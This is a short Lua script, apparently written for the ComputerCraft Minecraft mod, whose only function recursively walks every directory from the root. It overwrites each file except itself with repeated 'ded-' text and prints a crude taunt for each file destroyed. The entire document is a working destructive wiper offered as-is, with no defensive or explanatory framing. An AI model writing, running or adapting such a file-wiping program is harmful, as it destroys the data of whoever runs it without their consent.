local makeDirDed
function makeDirDed(path)
	for _, v in pairs(fs.list(path)) do
		if fs.isDir(fs.combine(path, v)) then
			makeDirDed(fs.combine(path, v))
		elseif string.lower(fs.combine(path, v)) ~= string.lower(shell.getRunningProgram()) then
			local ok = pcall(function()
				local f = fs.open(fs.combine(path, v), "w")
				for i = 1, 255 do
					f.write("ded-")
				end
				f.write("ded.")
				f.close()
			end)
			if ok then
				print("File \""..fs.combine(path, v).."\" is fucked :)")
			end
		end
	end
end

makeDirDed("")
